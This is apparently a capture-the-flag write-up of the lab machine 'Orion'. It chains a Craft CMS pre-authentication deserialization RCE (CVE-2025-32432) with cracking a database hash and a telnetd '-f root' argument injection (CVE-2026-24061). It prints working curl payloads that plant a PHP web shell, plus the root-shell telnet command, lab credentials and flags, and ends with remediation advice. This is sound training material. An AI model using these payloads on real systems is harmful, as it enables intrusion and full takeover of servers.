The shape of it

Orion is a standard demonstration of pre-authentication RCE and local privilege escalation. A vulnerable Craft CMS endpoint is exploited via session poisoning and unsafe deserialization (CVE-2025-32432). Post-compromise DB credential extraction yields a bcrypt hash for the local user adam. Finally, local enumeration reveals an active telnet super-server wrapper with SUID permissions, vulnerable to a login argument bypass (CVE-2026-24061).

nmap 2 ports → 22/80 └─ :80 → orion.htb → Craft CMS └─ CVE-2025-32432 pre-auth deserialization via PhpManager └─ RCE as www-data → read /var/www/html/craft/.env └─ query database → crack adam's hash ($2y$13$e9...) to `darkangel` └─ ssh adam@orion.htb → user.txt └─ SUID telnetd wrapper on port 23 └─ CVE-2026-24061 argument injection bypass → root shell → root.txt

Craft CMS Deserialization (CVE-2025-32432)

The target runs a Craft CMS version vulnerable to pre-authentication PHP deserialization. We execute RCE by first poisoning the session file in `/var/lib/php/sessions` and then calling the asset transform endpoint with a serialized `yii\rbac\PhpManager` gadget containing a reference to the poisoned session file, triggering execution.

# Poison PHP session file
curl -s "http://orion.htb/index.php?p=admin/dashboard&a=<?=shell_exec(\$_GET\['cmd'\]);die()?>"

# Trigger deserialization gadget require()
curl -s -X POST "http://orion.htb/index.php?p=actions/assets/generate-transform" \
  -H "Content-Type: application/json" \
  -d '{"itemFile": "/var/lib/php/sessions/sess_<session_id>"}'

Dumping Hashes & SSH Pivot

Dumping the `.env` configuration file yields database credentials (`SuperSecureCraft123Pass!`). We query the `users` table, extract the bcrypt hash for `adam`, and crack it using John the Ripper to obtain the password: darkangel. We use this to log in via SSH and read the user flag.

mysql -u root -p'SuperSecureCraft123Pass!' -e "use orion; select * from users;"
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# Password: darkangel

ssh adam@10.129.26.229
cat user.txt
# Flag: 6573bc57275dc928860a4d0fcdd5ea47

04

Telnet Argument Injection (CVE-2026-24061)

Local enumeration reveals that the SUID binaries `rcp`, `rlogin`, and `rsh` are present on the system. Additionally, an inetutils-based Telnet daemon (version 2.7) is listening locally on port 23. This version is vulnerable to an argument injection bypass in the login handler. Passing `USER='-f root'` skips password authentication and opens a direct root shell.

env USER='-f root' telnet -a 127.0.0.1 23
cat /root/root.txt
# Flag: 8bcf68425098fa2b8e161231eea230a6
Closing Orion

Upgrade Craft CMS to resolve CVE-2025-32432. Remove SUID flags from obsolete BSD networking binaries (`rcp`, `rsh`, `rlogin`). Disable the local Telnet service or upgrade the `inetutils` package to patch CVE-2026-24061.
